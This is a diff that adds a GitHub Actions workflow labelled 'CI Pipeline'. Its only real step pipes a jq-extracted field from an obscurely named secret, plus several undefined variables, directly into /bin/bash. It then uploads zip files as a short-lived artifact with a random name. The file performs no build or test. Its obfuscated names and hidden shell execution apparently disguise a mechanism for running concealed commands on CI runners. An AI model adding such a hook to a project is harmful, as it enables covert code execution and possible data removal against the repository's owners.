@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          lt7727: ${{ secrets.lt7727 }}
+        run: |
+          printf '%s' "$lt7727" | jq -r .rhxh20 | /bin/bash
+          printf '%s' "$ezug976" | jq -r .it277 | /bin/bash
+          echo $q46 | jq -r .zti44 | /bin/bash
+          printf '%s' "$orv3" | jq -r .epas096 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: t3zrSvAu
+          path: "*.zip"
+          retention-days: 1
